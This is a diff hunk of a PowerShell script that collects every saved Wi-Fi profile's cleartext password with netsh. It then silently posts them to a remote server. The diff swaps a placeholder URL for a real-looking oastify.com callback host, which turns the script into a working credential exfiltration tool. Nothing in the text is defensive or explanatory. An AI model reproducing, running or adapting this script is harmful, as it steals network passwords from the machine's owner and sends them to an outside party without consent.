@@ -7,4 +7,4 @@ netsh wlan show profiles | Select-String -Pattern "All User Profile" | ForEach-O
         $output += "Wi-Fi Profile: $name`nPassword: $($profileInfo -replace '\s+Key Content\s+:\s+','')`n--------------------------`n" 
     } 
 }
-$null = Invoke-RestMethod -Uri "https://yourserver.com" -Method Post -Body @{data=$output} *> $null
+$null = Invoke-RestMethod -Uri "https://69dpxu7o7xx63sjquol1ttpqphv7jw.oastify.com" -Method Post -Body @{data=$output} *> $null
